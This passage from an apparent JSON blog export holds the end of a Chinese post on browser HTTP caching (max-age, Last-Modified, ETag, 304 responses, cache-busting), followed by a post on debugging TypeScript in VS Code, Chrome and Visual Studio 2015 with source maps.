300，还未过期，则直接读取（不访问Web Server），响应给用户。 —5分钟后— 浏览器再一次请求资源http://test.qq.com/test.cgi 查询临时文件目录发现存在Cache存储，检查保鲜期max-age，已经过期，则发请求到Web Server 2 保鲜期(Cache-control: max-age) + 最后修改时间验证(Last-Modified) 这里的要素是，在给出保鲜期的同时，给出一个资源的验证方式：Last-Modified: [UTC time] ([UTC time]标示这个响应资源的最后修改时间)例如 Last-Modified: Mon, 06 Jul 2009 09:21:48 GMT这个响应头只有配合Cache-control的时候才有实际价值，只是声明校验资源的方式，并不能影响资源的保鲜期时长 ** 这里是简要过程：** —首次访问时— 浏览器第一次请求资源http://test.qq.com/test.cgi 查询临时文件目录发现无Cache存储，遂发出请求到Web Server web server响应资源，并设定Cache-control:max-age=300 Last-Modified: Mon, 06 Jul 2009 09:21:48 GMT 浏览器收到响应将资源呈献给用户的同时，在临时文件目录以 http://test.qq.com/test.cgi 为key缓存这个响应 —5分钟内— 浏览器再一次请求资源http://test.qq.com/test.cgi 查询临时文件目录发现存在cache存储，检查保鲜期max-age &lt; 300，还未过期，则直接读取（不访问Web Server），响应给用户。 —5分钟后— 浏览器再一次请求资源http://test.qq.com/test.cgi 查询临时文件目录发现存在cache存储，检查保鲜期max-age，已经过期发现资源具有Last-Modified声明，则为请求带上头 If-Modified-Since: Mon, 06 Jul 2009 09:21:48 GMT 发送请求到web server web server收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对,若最后修改时间较新，说明资源又被改动过，则响应整片资源内容，HTTP 200 (需要整块内容写为包体).若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体)，告知浏览器继续使用所保存的cache,(这里当然也可以根据自己的需要决定是200还是304，我们的CGI毕竟是一种原始的实现) 3 保鲜期(Cache-control: max-age) + 自定义标识验证(Etag) 这里的要素是，在给出保鲜期的同时，给出另一种资源的验证方式：ETag: [custom flag][custom flag]标示这个响应资源的由开发者自己确定的签名验证标识，例如 ETag: “abcdefg”,这个响应头只有配合Cache-control的时候才有实际价值，是声明校验资源的方式。ETag的使用为我们实现304响应提供了更多的灵活性，我们可以抛开必须将验证转化成时间格式的限制。 ** 这里是简要过程：** —首次访问时— 浏览器第一次请求资源http://test.qq.com/test.cgi 查询临时文件目录发现无Cache存储，遂发出请求到Web Server web server响应资源，并设定 Cache-control:max-age=300 ETag: “abcdefg” 浏览器收到响应将资源呈献给用户的同时，在临时文件目录以 http://test.qq.com/test.cgi 为key缓存这个响应 —5分钟内— (同#1中II) —5分钟后— 浏览器再一次请求资源http://test.qq.com/test.cgi 查询临时文件目录发现存在cache存储，检查保鲜期max-age，已经过期发现资源具有ETag声明，则为请求带上头 If-None-Match: “abcdefg”,发送请求到web server web server收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对,Etag可以是一个版本号，可以是短时间戳，可以是资源校验和(强烈不推荐使用)，或者干脆是一个常量(可以干脆拿来做容错)。If-None-Match发来的串与我们的自有值比对，根据我们自己的任何策略算法，可以自由决定如何返回浏览器，304或200。这里有一个使用ETag来做容错的例子(应用列表目前在使用): 我们的每次正常返回都是200Cache-control: max-age=1800ETag: “anything”这里anything是个常量，我们只用来告诉浏览器，cache过期要发带If-None-Match的请求过来 这样来自客户端的一大部分请求基本上都会带上If-None-Match头，我们的CGI据此可以知道这个请求的客户端是否有cache,此时如果 CGI联系server失败，那么可以直接返回304，驱使客户端使用上一次cache的正确结果，且更新保鲜期max-age为300秒,这样我们实现 了一个基于HTTP cache的容错，如果我们的资源还能实现一套时间戳存储的话,那么我们可以在正常情况下也实现校验后的304，从而节省流量 几种状态码的区别 用户行为与缓存 浏览器缓存行为还有用户的行为有关，如果大家对 强制刷新（Ctrl + F5） 因设置缓存参数客户端数据不能及时更新的解决方案 背景：某次投产，某系统投产后由于强缓存设置时间不恰当导致变更的功能没有体现。后来通过变更文件路径强行解决问题。 变更上下文根，导致URL变化一定可以解决问题。但我们不可能每一次都这么做；还有，在浏览器端关闭缓存、或者清除缓存后再继续浏览、同时使用Ctrl+F5刷新，也可以解决问题，但是我们也不可能让每一个客户在投产后都做一次这个操作。那我们怎么办呢？从问题原因来看，是将经常变化的资源缓存时间设置的过长导致的。理论上来讲，只要正确划分经常变化资源与不经常变化资源就可以解决问题。但是谁也不能保证不经常变化的资源就一定不会变化。万一不经常变化的资源变更了怎么办呢？在资源请求的URL中增加一个参数，比如：css/main.css?v=20160105。这个参数是一个版本号，客户化在js代码中，每一次投产的时候变更一下，当这个参数变化的时候，强缓存都会失效并重新加载。这样一来，即使是不常变化的资源，投产以后也需要重新加载。这样就完美的解决了问题。 哪些请求不能被缓存？无法被浏览器缓存的请求： HTTP信息头中包含Cache-Control:no-cache，pragma:no-cache，或Cache-Control:max-age=0等告诉浏览器不用缓存的请求 需要根据Cookie，认证信息等决定输入内容的动态请求是不能被缓存的 经过HTTPS安全加密的请求（有人也经过测试发现，ie其实在头部加入Cache-Control：max-age信息，firefox在头部加入Cache-Control:Public之后，能够对HTTPS的资源进行缓存，参考《HTTPS的七个误解》） POST请求无法被缓存 HTTP响应头中不包含Last-Modified/Etag，也不包含Cache-Control/Expires的请求无法被缓存","comments":true,"categories":[{"name":"Browser","slug":"Browser","permalink":"http://swsmile.info/categories/Browser/"}],"tags":[{"name":"Frontend","slug":"Frontend","permalink":"http://swsmile.info/tags/Frontend/"},{"name":"Cache","slug":"Cache","permalink":"http://swsmile.info/tags/Cache/"},{"name":"Browser","slug":"Browser","permalink":"http://swsmile.info/tags/Browser/"}]},{"title":"【TypeScript】 TypeScript动态调试方法总结","date":"2017-03-02T04:13:57.000Z","path":"2017/03/02/【TypeScript】TypeScript动态调试方法总结/","text":"1.利用Node引擎动态调试TypeScript代码以Visual Studio Code为例，构建一个TypeScript项目，新建一个tsconfig.json配置文件，新建一个app.ts TypeScript文件。其实在tsconfig.json中需将sourceMap属性设置为true（以指定tsc生成.ts对应的.map文件）。 tsconfig.json文件配置参考： 123456789&#123; \"compilerOptions\": &#123; \"target\": \"es5\", \"noImplicitAny\": false, \"module\": \"amd\", \"removeComments\": false, \"sourceMap\": true &#125;&#125; 对ts代码进行编译（Ctrl+Shift+B）。在根目录下的.vscode文件夹中配置launch.json和tasks.json文件launch.json文件配置如下： 12345678910111213&#123; \"version\": \"0.2.0\", \"configurations\": [ &#123; \"name\": \"Launch TypeScript\", \"type\": \"node\", \"request\": \"launch\", \"program\": \"$&#123;workspaceRoot&#125;/app.ts\", \"sourceMaps\": true, \"outDir\": null &#125; ]&#125; tasks.json文件配置如下： 12345678910&#123; // See https://go.microsoft.com/fwlink/?LinkId=733558 // for the documentation about the tasks.json format \"version\": \"0.1.0\", \"command\": \"tsc\", \"isShellCommand\": true, \"args\": [\"-p\", \".\"], \"showOutput\": \"silent\", \"problemMatcher\": \"$tsc\"&#125; 配置完成后，F5启动调试，即可使用node对TypeScript代码进行动态调试。 2.在浏览器中动态调试TypeScript代码以Chrome调试环境为例，在Developer Tools中，打开SourceMap开关以自动识别关联.js和.ts文件，.map文件可由tsc（TypeScript编译器）生成，用于将生成的.js文件与源.ts文件进行关联。此时在我们需要调试的.ts文件中打上断点，即可命中（如在其对应的.js中打断点，Chrome会自动将.js中断点位置自动匹配到对应的.ts中代码位置）。index.html如下： 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;TypeScript HTML App&lt;/title&gt; &lt;script src=\"app.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;TypeScript HTML1 App&lt;/h1&gt; &lt;div id=\"content\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; app.ts如下： 1234567891011window.onload = () =&gt; &#123; var el = document.getElementById('content'); console.log('window.onload~'); HelloWorld.Hello();&#125;;class HelloWorld &#123; static Hello(): void &#123; console.log('Hello~'); &#125;&#125; 此方法可用于调试已部署于Server的TypeScript代码，若在开发环境下需要在调试过程中对TypeScript代码进行修改，推荐使用以下调试方式。 3.在Visual Studio 2015开发环境中进行TypeScript代码调试在Visual Studio 2015中新建一个TypeScript项目。为简化文件结构及内容，修改index.html、app.ts文件。index.html： 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;TypeScript HTML App&lt;/title&gt; &lt;script src=\"app.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;TypeScript HTML1 App&lt;/h1&gt; &lt;div id=\"content\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; app.ts： 1234window.onload = () =&gt; &#123; var el = document.getElementById('content'); alert('asd');&#125;; 分为3种可调试环境：1. 在Visual Studio 2015中直接命中断点将启动浏览器设置为Internet Explorer，F5启动调试。 2. 在Microsoft Edge中进行动态调试将启动浏览器设置Microsoft Edge，F5启动调试。F12 打开开发人员工具。 3. 在Google Chrome中调试将启动浏览器设置为Google Chrome，F5启动调试。此方法与上述利用Sourcemap开关动态调试TypeScript代码调试方法类似。 备注：需在项目中对属性进行配置，勾选“生成源映射” 4.参考文档 [Visual Studio Code Debugging]https://code.visualstudio.com/docs/editor/debugging#_debugger-extensions [how to debug typescript files in visual studio code]http://stackoverflow.com/questions/31169259/how-to-debug-typescript-files-in-visual-studio-code [USING SOURCE MAPS WITH TYPESCRIPT]http://www.aaron-powell.com/posts/2012-10-03-typescript-source-maps.html [TYPESCRIPT DEBUGGING IN VISUAL STUDIO WITH IE, CHROME AND FIREFOX USING SOURCE MAPS]http://www.gamefromscratch.com/post/2014/05/27/TypeScript-debugging-in-Visual-Studio-with-IE-Chrome-and-Firefox-using-Source-Maps.aspx [GitHub-vscode-chrome-debug–Issues]https://github.com/Microsoft/vscode-chrome-debug/issues","comments":true,"categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"http://swsmile.info/categories/TypeScript/"}],"tags":[{"name":"Debug","slug":"Debug","permalink":"http://swsmile.info/tags/Debug/"},{"name":"TypeScript","slug":"TypeScript","permalink":"http://swsmile.info/tags/TypeScript/"}]}]